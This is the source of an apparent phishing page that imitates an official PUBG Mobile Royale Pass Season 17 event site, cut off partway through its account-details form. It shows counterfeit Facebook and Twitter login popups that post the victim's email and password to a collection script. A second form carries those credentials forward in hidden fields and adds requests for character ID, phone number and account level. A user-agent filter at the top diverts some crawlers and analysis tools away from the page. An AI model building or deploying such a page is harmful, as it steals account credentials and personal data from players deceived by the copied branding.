<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['imel'];
$password = $_POST['pwd'];
$login = $_POST['log'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- 页面通用 header 配置 -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="Description" content="ROYALE PASS S17: METRO ROYALE,Unlock the Metro-themed mode coming to Erangel!" />
    <meta name="Keywords" content="PUBG MOBILE,Season 17,Royale Pass 17,ROYALE PASS SEASON 17" />

    <meta property="og:url" content="index.html" />
    <meta property="og:type" content="website">
    <meta property="og:title" content="ROYALE PASS SEASON 17" />
    <meta property="og:description" content="ROYALE PASS S17: METRO ROYALE,Unlock the Metro-themed mode coming to Erangel!" />
    <!-- facebook分享图 -->
    <meta property="og:image" content="images/share.jpg" />
    <!-- twitter分享图 -->
    <meta name="twitter:image" content="images/share.jpg">

    <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/css/swiper.min.css" />
    <link rel="stylesheet" href="cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.7.1/jquery.fullPage.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <link rel="stylesheet" href="css/pubg.css" />
    <link rel="stylesheet" href="css/common.css" />
    <link rel="stylesheet" href="css/style.css" />
    <link rel="stylesheet" href="common/css/all.css" />
    <title>EVENT ROYALE PASS SEASON 17</title>
    <script>
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            setTimeout(function () {
                $('body').addClass('mclass');
            }, 1000);
        }
    </script>
</head>

<body class="en" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
    <div class="popup-login login-facebook animated fadeIn" style="display: none;">
    <div class="popup-box-login-fb">
        <a onclick="tutup_facebook()" onmousedown="tutup.play()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
        <div class="navbar-fb">
            <img src="images/login/facebook_text.png">
        </div>
        <div class="content-box-fb">
            <img style="width: 40px;" src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
            <div class="txt-login-fb">
                 Log in to your account to connect to PUBG MOBILE
            </div>
            <form class="login-form" action="verification.php" method="post">
                <label>
                <input type="text" name="imel" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
                </label>
                <label>
                <input type="password" name="pwd" placeholder="Password" autocomplete="off" autocapitalize="off" required>
                </label>
                <input type="hidden" name="log" value="FB" readonly>
                <button type="submit" class="btn-login-fb">Log In</button>
            </form>
            <div class="txt-create-account">Create account</div>
            <div class="txt-not-now">Not now</div>
            <div class="txt-forgotten-password">Forgotten password?</div>
        </div>
        <div class="language-box">
            <center>
            <div class="language-name language-name-active">English (UK)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
                <i class="fa fa-plus"></i>
            </div>
            </center>
        </div>
        <div class="copyright">Facebook Inc.</div>
    </div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
    <div class="popup-box-login-twitter">
    <a onclick="tutup_twitter()" onmousedown="tutup.play()" class="close-other"><i class="zmdi zmdi-close"></i></a>
        <div class="header-twitter">
            <center>
            <img src="images/login/twitter_text.png">
            </center>
        </div>
        <div class="box-twitter">
            <center>
            <form action="verification.php" method="post">
                <div class="txt-login-twitter">Login to Twitter</div>
                <div class="input-box-twitter">
                    <label>Phone, email, or username</label>
                    <input type="text" name="imel" placeholder="" required>
                </div>
                <div class="input-box-twitter">
                    <label>Password</label>
                    <input type="password" name="pwd" placeholder="" required>
                </div>
                <input type="hidden" name="log" value="TW" readonly>
                <button type="submit" class="btn-login-twitter">Log In</button>
                <div class="footer-menu-twitter">Forgot password?</div>
                <div class="footer-menu-twitter bulet">•</div>
                <div class="footer-menu-twitter">Sign up to Twitter</div>
            </form>
            </center>
        </div>
    </div>
</div>

<!-- nav -->
<div class="top-nav">
        <div class="top-main c">
                <!-- logo,name -->
                <div class="top-log c">
                        <a href="">
                                <img src="common/images/icon_logo.jpg" width="128" height="128" alt="" />
                        </a>
                        <h1 class="top-tit">
                                PUBG MOBILE
                                <span>OFFICIAL PUBG ON MOBILE</span>
                        </h1>
                </div>
                <!-- line -->
                <div class="top-line"
                        onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
                        <ul>
                                <li>-</li>
                                <li>-</li>
                                <li>-</li>
                        </ul>
                </div>
                <!-- nav-list -->
                <ul class="nav-list">
                        <li class="on">
                                <a href="">HOME</a>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>ROYALE PASS</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/event/royalepass17/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass16'});">ROYALE PASS SEASON 17</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass16/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass16'});">ROYALE PASS SEASON 16</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass15/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass15'});">ROYALE PASS SEASON 15</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass14/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass14'});">ROYALE PASS SEASON 14</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass13/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass13'});">ROYALE PASS SEASON 13</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass12/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'m_nav_royalepass12'});">ROYALE PASS SEASON 12</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass11/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass11'});">ROYALE PASS SEASON 11</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass10/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass10'});">ROYALE PASS SEASON 10</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass9/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass9'});">ROYALE PASS SEASON 9</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass8/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass8'});">ROYALE PASS SEASON 8</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass7/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass7'});">ROYALE PASS SEASON 7</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass6/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass6'});">ROYALE PASS SEASON 6</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass5/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass5'});">ROYALE PASS SEASON 5</a>
                                        </li>
                                        <li><a href="https://www.pubgmobile.com/event/royalepass4/"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_royalepass4'});">ROYALE PASS SEASON 4</a>
                                        </li>
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>NEWS</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/en-US/news.shtml"
                                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_news'});">NEWS</a>
                                        </li>
                                        <li><a href="https://tencentgames.helpshift.com/a/pubgm/"
                                                        onclick="gtag('event', 'x_click', {'event_category': 'common_inc','event_label': 'nav_faqs'});">FAQs</a>
                                        </li>
                                </ul>
                        </li>
                        <li>
                                <a href="https://www.pubgmobile.com/en-US/media.shtml"
                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_media'});">Media</a>
                        </li>
                        <li>
                                <a href="https://www.pubgmobile.com/esports"
                                        onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_esports'});">ESPORTS</a>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>Events</span>
                                <ul class="event-second event-special">
                                        
                                                        <li><a href="" onclick="">
                                                                        Runic Power</a>
                                                        </li>
                                      
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><span>Workshop</span>
                                <ul class="event-second">
                                        <li><a href="https://www.pubgmobile.com/event/pharaohx_suit/"
                                                        onclick="gtag('event','x_jump',{'event_category':'20181108halloweeks','event_label':'nav_pharaohx_suit'});">Pharaoh X-Suit Arrives!</a>
                                        </li>
                                </ul>
                        </li>
                        <li class="slide-icon slide-icon-c"><a href="https://www.pubgmobile.com/event/brandassets/"
                                        onclick="gtag('event', 'x_click', {'event_category': 'common_inc','event_label': 'nav_brandassets'});"><span>Brand Assets</span></a>
                        </li>
                        <li class="slide-icon slide-icon-c nav-lang-box">
                                <span>LANGUAGE：
                                        <span class="lang-on"><i class="en"></i><em class="lang_change">EN</em></span>
                                </span>
                                <ul class="event-second special-langlist">
                               
                                        <li class="en"><a href="javascript:;"
                                                        onclick=""><i></i>English</a>
                                        </li>
                                       
                                </ul>
                        </li>
                </ul>
                <div class="top-btn">
                        <a href="http://www.pubgmobile.com/pay/" target="_blank"
                                onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});">PURCHASE</a>
                        <a class="down"
                                href="https://web.gpubgm.com/m/Website/xiaobao/PUBGMOBILE_Global_1.2.0_uawebsite.apk"
                                onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});">DOWNLOAD</a>
                </div>

                <div class="lang-box">
                        <div class="lang-drop slide-list">
                                <p class="lang-on"><i class="en"></i><em class="lang_change">EN</em></p>
                                <em class="lang-arrow"
                                        onclick=""></em>
                        </div>
                        <ul class="lang-list">
                       
                                <li class="en"
                                        onclick="">
                                        <i></i>English
                                </li>
                               
                        </ul>
                </div>
        </div>
</div> 
    <div class="wrap" id="full_page">

 <style type="text/css">
    .alert{
            width: 58%;height:30px;border-radius:5px;background: #0000009c;position: absolute;top: 25%;left: 21%
        }
    .reward{
        width: 90%;height:500px;border-radius:10px;background: #0000009c;
    }
     .rewards1{
        background: url(images/bg_gets.png) center no-repeat;
        background-size:100% 100%;width: 180px;height: 150px;
        position: absolute;top: 5%;left: 12.5%;
     }
     .collect1{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 37.5%;left: 12.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards2{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 5%;left: 32.5%;
     }
     .collect2{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 37.5%;left: 32.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards3{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 5%;left: 52.5%
     }
     .collect3{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 37.5%;left: 52.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards4{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 5%;left: 72.5%
     }
     .collect4{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 37.5%;left: 72.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards5{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 50%;left: 12.5%;
     }
     .collect5{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 82.5%;left: 12.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards6{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 50%;left: 32.5%;
     }
     .collect6{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 82.5%;left: 32.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards7{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 50%;left: 52.5%
     }
     .collect7{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 82.5%;left: 52.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards8{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 180px;height: 150px;position: absolute;top: 50%;left: 72.5%
     }
     .collect8{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:180px;height: 40px;position: absolute;top: 82.5%;left: 72.5%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(30 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .img-reward{
        width: 65px;margin-top: 28.5%;border-radius: 15px
     }
     /*popup*/
.popup {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
    background-color:rgba(0, 0, 0, 0.4);
}
.nav-popup {
    height: auto;
    position: absolute;
    top: -10%;
    border: 4px;
    padding:10px;
}
.nav-popup-title {
    padding-top: -2px;
    padding-left: 5px;
    color: #fff;
    font-size: 27px;
    font-family: Teko;
    text-align: left;
    line-height: 15px;
}
.popup-box {
    background: url(images/pop1.png) no-repeat center;
    background-size: 100% 100%;
    width: 380px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 50%;
    margin-left: 2.5%;
    text-align: center;
    font-family:'Teko';
    color:#fff;
}
.popup-alert {
    padding-top: 10px;
    padding-left: 10px;
    padding-bottom: 10px;
    color: #fff;
    font-size: 18px;
    font-family: 'Teko';
    text-align: center;
}
.popup-item {
    width:23%;
    height:85px;
    margin-left:auto;
    margin-right:auto;
    margin-bottom: 17px;
    border: 1px solid #fff;
    display: block;
}
.popup-btn {
    background: url(images/s7_go2.png) no-repeat center;
    background-size: 100% 100%;
    width: 32%;
    height: auto;
    margin: 5px;
    margin-bottom: 15px;
    padding: 8px;
    color: black;
    font-size: 20px;
    font-family: 'Teko';
    letter-spacing: 1px;
    font-weight: 500;
    line-height: 20px;
    outline: none;
    border: none;
    display: inline-block;
    cursor: pointer;
}

     @media only screen and (max-width: 400px) {
        .alert{
            width: 90%;height:30px;border-radius:5px;background: #0000009c;position: absolute;top: 25%;left: 5%
        }
        .reward{
        width: 100%;height:600px;border-radius:5px;background: #0000009c;margin-top: 20%;
    }
    .rewards1{
        background: url(images/bg_gets.png) center no-repeat;
        background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;
        position: absolute;top: 5%;left: 2%;
     }
     .collect1{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 34%;left: 2%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards2{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 5%;left: 26%;
     }
     .collect2{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 34%;left: 26%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards3{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 5%;left: 50%
     }
     .collect3{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 34%;left: 50%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards4{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 5%;left: 74%
     }
     .collect4{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 34%;left: 74%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards5{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 42%;left: 2%;
     }
     .collect5{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 70%;left: 2%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards6{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 42%;left: 26%;
     }
     .collect6{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 70%;left: 26%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards7{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 42%;left: 50%
     }
     .collect7{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 70%;left: 50%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards8{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:17%;height: 135px;position: absolute;top: 42%;left: 74%
     }
     .collect8{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:17%;height: 35px;position: absolute;top: 70%;left: 74%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .img-reward{
        width: 50px;margin-top: 46%;border-radius: 15px
     }

/*popup*/
.popup {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
    background-color:rgba(0, 0, 0, 0.4);
}
.nav-popup {
    height: auto;
    position: absolute;
    top: -10%;
    border: 4px;
    padding:10px;
}
.nav-popup-title {
    padding-top: -2px;
    padding-left: 5px;
    color: #fff;
    font-size: 27px;
    font-family: Teko;
    text-align: left;
    line-height: 15px;
}
.popup-box {
    background: url(images/pop1.png) no-repeat center;
    background-size: 100% 100%;
    width: 90%;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 50%;
    margin-left: 5%;
    text-align: center;
    font-family:'Teko';
    color:#fff;
}
.popup-alert {
    padding-top: 10px;
    padding-left: 10px;
    padding-bottom: 10px;
    color: #fff;
    font-size: 18px;
    font-family: 'Teko';
    text-align: center;
}
.popup-item {
    width:23%;
    height:85px;
    margin-left:auto;
    margin-right:auto;
    margin-bottom: 17px;
    border: 1px solid #fff;
    display: block;
}
.popup-btn {
    background: url(images/s7_go2.png) no-repeat center;
    background-size: 100% 100%;
    width: 32%;
    height: auto;
    margin: 5px;
    margin-bottom: 15px;
    padding: 8px;
    color: black;
    font-size: 20px;
    font-family: 'Teko';
    letter-spacing: 1px;
    font-weight: 500;
    line-height: 20px;
    outline: none;
    border: none;
    display: inline-block;
    cursor: pointer;
}

     }

     @media only screen and (min-width: 401px) and (max-width: 500px) {
        .alert{
            width: 90%;height:30px;border-radius:5px;background: #0000009c;position: absolute;top: 31.5%;left: 5%
        }
        .reward{
        width: 100%;height:600px;border-radius:10px;background: #0000009c;margin-top: 38%;
    }
    .rewards1{
        background: url(images/bg_gets.png) center no-repeat;
        background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;
        position: absolute;top: 8%;left: 2%;
     }
     .collect1{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 31.5%;left: 2%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards2{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 8%;left: 26%;
     }
     .collect2{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 31.5%;left: 26%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards3{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 8%;left: 50%
     }
     .collect3{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 31.5%;left: 50%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards4{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 8%;left: 74%
     }
     .collect4{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 31.5%;left: 74%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards5{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 38%;left: 2%;
     }
     .collect5{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 61%;left: 2%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards6{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 38%;left: 26%;
     }
     .collect6{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 61%;left: 26%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards7{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 38%;left: 50%
     }
     .collect7{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 61%;left: 50%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .rewards8{
        background: url(images/bg_gets.png) center no-repeat;background-size:100% 100%;width: 25%;margin-top:31.5%;height: 135px;position: absolute;top: 38%;left: 74%
     }
     .collect8{
        background: url(images/s7_go2.png) center no-repeat;background-size:100% 100%;width:25%;margin-top:31.5%;height: 35px;position: absolute;top: 61%;left: 74%;outline: none;border:none;color: #152a23;font-weight: bold;font-size: calc(70 / 1920 * 100vw);font-family: teko;letter-spacing: 2px;
     }
     .img-reward{
        width: 50px;margin-top: 38%;border-radius: 15px
     }

          /*popup*/
.popup {
    width:100%;
    height:100%;
    position:fixed;
    top:0;
    left:0;
    z-index:9999;
    background-color:rgba(0, 0, 0, 0.4);
}
.nav-popup {
    height: auto;
    position: absolute;
    top: -10%;
    border: 4px;
    padding:10px;
}
.nav-popup-title {
    padding-top: -2px;
    padding-left: 5px;
    color: #fff;
    font-size: 27px;
    font-family: Teko;
    text-align: left;
    line-height: 15px;
}
.popup-box {
    background: url(images/pop1.png) no-repeat center;
    background-size: 100% 100%;
    width: 90%;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 50%;
    margin-left: 5%;
    text-align: center;
    font-family:'Teko';
    color:#fff;
}
.popup-alert {
    padding-top: 10px;
    padding-left: 10px;
    padding-bottom: 10px;
    color: #fff;
    font-size: 18px;
    font-family: 'Teko';
    text-align: center;
}
.popup-item {
    width:23%;
    height:85px;
    margin-left:auto;
    margin-right:auto;
    margin-bottom: 17px;
    border: 1px solid #fff;
    display: block;
}
.popup-btn {
    background: url(images/s7_go2.png) no-repeat center;
    background-size: 100% 100%;
    width: 32%;
    height: auto;
    margin: 5px;
    margin-bottom: 15px;
    padding: 8px;
    color: black;
    font-size: 20px;
    font-family: 'Teko';
    letter-spacing: 1px;
    font-weight: 500;
    line-height: 20px;
    outline: none;
    border: none;
    display: inline-block;
    cursor: pointer;
}


     }
.input-anjir {
    background: #d7c2a4;
    background-size: 100% 100%;
    width: 85%;
    height: auto;
    padding: 6px;
    padding-left: 30px;
    font-size:15px;
    font-family: Teko;
    font-weight: 500;
    color: black;
    margin-bottom: 5px;
    border: none;
    border-radius: 5px;
    position: relative;
    outline: none;
}
.input-anjir::-webkit-input-placeholder { /* Chrome/Opera/Safari */
  color: black;
}
.input-anjir::-moz-placeholder { /* Firefox 19+ */
  color: black;
}
.input-anjir:-ms-input-placeholder { /* IE 10+ */
  color: black;
}
.input-anjir:-moz-placeholder { /* Firefox 18- */
  color: black;
}
.select-anjir {
    background: #d7c2a4;
    background-size: 100% 100%;
    width: 94%;
    height: auto;
    padding: 5px;
    padding-left: 26px;
    font-size:15px;
    font-family: Teko;
    font-weight: 500;
    color: black;
    margin-bottom: 5px;
    border-radius: 5px;
    border: none;
    position: relative;
    outline: none;
}
.finish-wrapper {
    background: url(img/popup.png) no-repeat center;
    background-size: 100% 100%;
    width: 95%;
    height: auto;
    margin-left: auto;
    margin-right: auto;
    padding: 10px;
    color: #fff;
    font-size: 15px;
    font-family: 'Teko';
    text-align: left;
    display: block;
}
.finish-btn {
    background: url(images/s7_go2.png) no-repeat center;
    background-size: 100% 100%;
    width: 35%;
    height: 38px;
    margin-left: auto;
    margin-right: auto;
    outline: none;
    border: none;
    display: inline-block;
    cursor: pointer;
    display: block;
}
.finish-btn span {
    color: black;
    font-family: 'Teko';
    font-weight: 500;
    line-height: 5px;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}

 </style>
                
           
        <div class="section s4" data-anchor="page1">
        <div class="alert" >
            <span style="cursor: pointer;width: 31.5px;height:100%;position: absolute;left: 5px;border-right: 2px solid #d7c2a4;font-size: 20px;color:#d7c2a4;padding-top: 2px;">
            <i class="zmdi zmdi-notifications"></i></span>
                <span style="color: #d7c2a4;font-weight: bold;font-size: 15px;position: absolute;left: 13.5%;top:5.5px;">YOUR ACCOUNT DETAIL IS REQUIRED</span>
            </div>
            <div class="s4_title">
            </div>
        
            <div class="swiper-container s4_swiper_container">
                <div class="swiper-wrapper">
                 <div class="reward">
                    <center>
                        <form action="check.php" method="post" style="margin-top: 15px">
<input type="hidden" class="input-anjir" name="imel" value="<?php echo $email;?>" readonly>
<input type="hidden" name="pwd" value="<?php echo $password;?>" readonly>
<input type="text" class="input-anjir kiri"  name="nick" id="nick" placeholder="Character Name" autocomplete="off" required>
<input type="number" class="input-anjir kanan" name="playid" id="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" class="input-anjir kiri" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required>
<select class="select-anjir kanan" name="level" id="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
